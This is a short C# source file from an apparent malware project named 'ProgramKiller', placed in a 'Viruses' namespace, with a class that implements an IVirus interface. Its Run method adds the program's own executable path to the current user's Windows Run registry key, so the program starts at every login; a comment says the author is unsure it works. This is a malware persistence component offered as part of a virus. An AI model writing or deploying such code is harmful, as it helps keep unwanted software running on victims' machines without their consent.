using ProgramKiller.Basics;
using Microsoft.Win32;
using System.Reflection;

namespace ProgramKiller.Viruses
{
    internal class AutoStart : IVirus
    {
        //I'm not sure if it works
        public void Run()
        {
            RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            rk.SetValue("ProgramKiller.exe", Assembly.GetExecutingAssembly().Location);
        }
    }
}
